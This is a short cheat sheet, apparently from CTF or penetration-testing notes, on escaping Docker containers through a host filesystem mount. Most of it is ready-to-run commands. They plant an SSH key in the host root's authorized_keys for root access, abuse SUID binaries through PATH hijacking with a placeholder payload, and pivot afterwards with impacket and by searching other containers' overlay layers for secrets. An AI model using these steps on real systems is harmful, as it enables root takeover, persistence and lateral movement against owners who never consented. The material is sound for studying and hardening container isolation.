# Docker Container Breakout via Host Filesystem Mount

## Detection
- Container hostname is a short hex string (e.g., `c0e41e58c63c`)
- Check for `/mnt/host/`, `/host/`, `/rootfs/` mounts
- `mount | grep -i host` or `ls /mnt/host/etc/passwd`
- `ifconfig` shows 172.17.x.x (Docker bridge network)

## Exploitation: Write SSH Key to Host

```bash
# From root in container with /mnt/host/ mount:
# 1. Generate or reuse existing SSH key
ssh-keygen -t ed25519 -f /tmp/key -N ""

# 2. Write public key to host root's authorized_keys
echo "<pubkey>" >> /mnt/host/root/.ssh/authorized_keys

# 3. SSH to host on port 22 (not container port like 2222)
ssh -i /tmp/key root@<host_ip>
```

## Key Points
- Container port (e.g., 2222) ≠ host SSH port (22)
- Host SSH port may be key-only (authorized_keys restricts root login with forced command)
- Check `/mnt/host/root/.ssh/authorized_keys` for existing restrictions before writing
- After host root: check Docker socket, other containers, network pivots

## SUID Binary PATH Hijack (common in CTF containers)
```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check if binary calls commands without absolute path
strings /usr/local/sbin/<binary> | grep -i system

# Exploit: create fake binary in /tmp, prepend to PATH
echo '#!/bin/bash' > /tmp/whoami
echo '/bin/bash -c "<payload>"' >> /tmp/whoami
chmod +x /tmp/whoami
export PATH=/tmp:$PATH
/usr/local/sbin/<binary>
```

## Pivoting from Docker Host
- Docker host has full network access to all containers and host network
- Install tools: `apt-get update && apt-get install -y smbclient python3-pip`
- `pip3 install impacket` for AD attacks from Linux host
- Check `/mnt/host/var/lib/docker/overlay2/*/diff/` for flags/secrets in other containers
